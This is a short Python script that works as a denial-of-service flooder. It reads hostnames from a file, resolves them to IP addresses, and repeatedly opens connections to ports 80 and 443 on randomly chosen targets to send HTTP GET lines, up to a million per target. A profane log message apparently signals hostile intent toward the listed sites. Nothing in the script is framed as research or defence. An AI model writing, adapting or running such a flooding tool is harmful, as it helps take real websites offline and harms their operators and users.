import socket
import random
import logging


def get_ips(love:str) -> list:
    list_of_valid_ips = list()
    with open(love, "r") as love:
        urls = love.read().split("\n")
    for url in urls:
        try:
            list_of_valid_ips.append(
                {"url": url , "ip": socket.gethostbyname(url)}
            )
        except:
            pass
    return list_of_valid_ips

def send_requests(trgets:list) -> None:
    while True:
        trget = random.choice(trgets)
        ports = [80, 443]
        changer = 0
        while True:
            try:
                port = random.choice(ports)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((trget['ip'], port))
                s.sendto(
                    ("GET /" + trget["ip"] + " HTTP/1.1\r\n").encode("ascii"), 
                    (trget["ip"], port)
                )
                s.close()
                logging.info(f'IDI NAHUI {trget["url"]}: {trget["ip"]}:{port}')
                changer += 1
                if changer == 1_000_000:
                    break
            except Exception as ex:
                logging.info(f'{trget["url"]}: {trget["ip"]}:{port} {ex}')
                ports.remove(port)
                if not ports:
                    break